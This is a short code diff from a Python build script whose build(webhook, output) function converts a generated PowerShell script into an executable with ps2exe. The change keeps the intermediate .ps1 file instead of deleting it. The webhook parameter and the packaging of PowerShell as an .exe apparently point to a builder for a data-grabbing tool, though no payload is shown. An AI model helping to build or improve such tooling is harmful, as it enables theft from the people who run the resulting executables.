@@ -53,7 +53,7 @@ def build(webhook: str, output: str):
     
     print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
     subprocess.run(["powershell", "-Command", fr"Invoke-ps2exe .\{output}.ps1 .\{output}.exe"], capture_output=True)
-    os.remove(output+".ps1")
+    # os.remove(output+".ps1")
 
     shutil.rmtree("build")
     shutil.rmtree("dist")
